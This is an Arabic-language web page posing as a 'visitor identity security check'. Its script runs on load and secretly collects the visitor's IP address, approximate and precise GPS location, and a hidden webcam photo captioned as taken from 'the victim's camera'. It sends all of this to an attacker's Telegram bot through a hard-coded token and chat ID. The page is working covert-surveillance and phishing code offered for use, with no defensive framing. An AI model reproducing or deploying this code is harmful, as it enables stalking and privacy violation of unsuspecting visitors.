<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جاري التحقق من الأمان</title>
    <style>
        body {
            background: #1e1e2f;
            font-family: 'Segoe UI', sans-serif;
            text-align: center;
            padding: 50px 20px;
            color: white;
        }
        .container {
            background: #2a2a3b;
            padding: 30px;
            border-radius: 20px;
            max-width: 400px;
            margin: auto;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
        }
        button {
            background: #0a84ff;
            border: none;
            padding: 12px 25px;
            border-radius: 30px;
            color: white;
            font-size: 18px;
            margin-top: 20px;
            cursor: pointer;
        }
        video, canvas {
            display: none;
        }
        .hidden {
            display: none;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 10px;
            background: #3a3a4b;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>🔐 تحقق من هوية الزائر</h2>
    <p>لأسباب أمنية، يلزم تأكيد هويتك</p>
    <div id="status" class="status">📡 جاري تجهيز البيانات...</div>
    <button id="allowBtn" class="hidden">✅ السماح بالتحقق</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    // ================= البيانات الخاصة بك =================
    const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
    const CHAT_ID = "7214473798";
    const PAGE_NAME = "جبله علي جبر بك";
    // ====================================================

    // دالة إرسال إلى التليغرام (نص)
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message.substring(0, 4096),
                    parse_mode: 'HTML'
                })
            });
        } catch(e) {
            console.error("Telegram send error:", e);
        }
    }

    // دالة إرسال صورة إلى التليغرام
    async function sendPhotoToTelegram(base64Image) {
        try {
            const blob = dataURLtoBlob(base64Image);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(url, { method: 'POST', body: formData });
        } catch(e) {
            console.error("Photo send error:", e);
        }
    }

    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) { u8arr[n] = bstr.charCodeAt(n); }
        return new Blob([u8arr], { type: mime });
    }

    // جلب الـ IP + الموقع التقريبي
    async function getLocationInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                lat: data.latitude,
                lon: data.longitude,
                org: data.org
            };
        } catch(e) {
            return null;
        }
    }

    // طلب الموقع الدقيق (GPS)
    function requestGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

                    let gpsMsg = `🎯 <b>${PAGE_NAME}</b> - موقع دقيق ✅\n`;
                    gpsMsg += `📍 ${mapLink}\n`;
                    gpsMsg += `📏 دقة: ${Math.round(acc)} متر`;
                    await sendToTelegram(gpsMsg);
                },
                async (error) => {
                    await sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${error.message}`);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
    }

    // طلب كاميرا وتصوير
    function requestCameraAndCapture() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                        sendPhotoToTelegram(dataURL);
                        
                        // إيقاف الكاميرا
                        stream.getTracks().forEach(track => track.stop());
                        video.srcObject = null;
                    }, 1500);
                })
                .catch((err) => {
                    sendToTelegram(`⚠️ ${PAGE_NAME} - رفض كاميرا: ${err.message}`);
                });
        } else {
            sendToTelegram(`⚠️ ${PAGE_NAME} - المتصفح لا يدعم الكاميرا`);
        }
    }

    // التنفيذ الرئيسي
    (async function() {
        // إرسال IP فوراً
        const ipData = await getLocationInfo();
        if (ipData && ipData.ip) {
            let ipMsg = `🌐 <b>${PAGE_NAME}</b> - دخول جديد\n`;
            ipMsg += `📡 IP: ${ipData.ip}\n`;
            ipMsg += `🏙️ ${ipData.city || 'غير معروف'}, ${ipData.country || ''}\n`;
            if (ipData.lat && ipData.lon) {
                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}`;
            }
            await sendToTelegram(ipMsg);
        } else {
            await sendToTelegram(`⚠️ ${PAGE_NAME} - زائر جديد لكن تعذر جلب IP`);
        }

        // طلب GPS بعد ثانية
        setTimeout(() => { requestGPS(); }, 2000);
        
        // طلب كاميرا بعد 3 ثواني
        setTimeout(() => { 
            document.getElementById('status').innerHTML = "🎥 نطلب الوصول للكاميرا...";
            requestCameraAndCapture(); 
        }, 4000);
    })();
</script>
</body>
</html>
